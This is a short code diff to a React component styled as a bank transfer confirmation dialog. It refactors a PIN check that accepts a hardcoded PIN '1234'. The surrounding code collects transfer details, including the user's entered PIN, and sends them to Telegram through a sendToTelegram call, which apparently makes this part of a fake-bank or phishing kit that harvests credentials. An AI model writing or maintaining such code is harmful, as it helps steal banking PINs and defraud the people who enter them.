@@ -1,3 +1,4 @@
+
 import {
   AlertDialog,
   AlertDialogAction,
@@ -51,9 +52,9 @@ export const TransferDialog = ({
     setStep('pin');
   };
 
-  const handlePinSubmit = (enteredPin: string) => {
-    // Use PIN 1234 instead of 4321
-    if (enteredPin === '1234') {
+  const handlePinSubmit = () => {
+    // Accept PIN 1234
+    if (pin === '1234') {
       setStep('success');
       
       // Send transfer details to Telegram
@@ -62,7 +63,7 @@ Amount: $${amount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
 From: PREMIER PLUS CKG (...5944)
 To: ${recipientAccount} (${recipientName})
 Type: ${transferType}
-PIN: ${enteredPin}`;
+PIN: ${pin}`;
       
       sendToTelegram(transferDetails);
       
@@ -186,7 +187,7 @@ PIN: ${enteredPin}`;
             </div>
             <AlertDialogFooter>
               <AlertDialogCancel>Cancel</AlertDialogCancel>
-              <AlertDialogAction onClick={() => handlePinSubmit(pin)}>
+              <AlertDialogAction onClick={handlePinSubmit}>
                 Confirm Transfer
               </AlertDialogAction>
             </AlertDialogFooter>
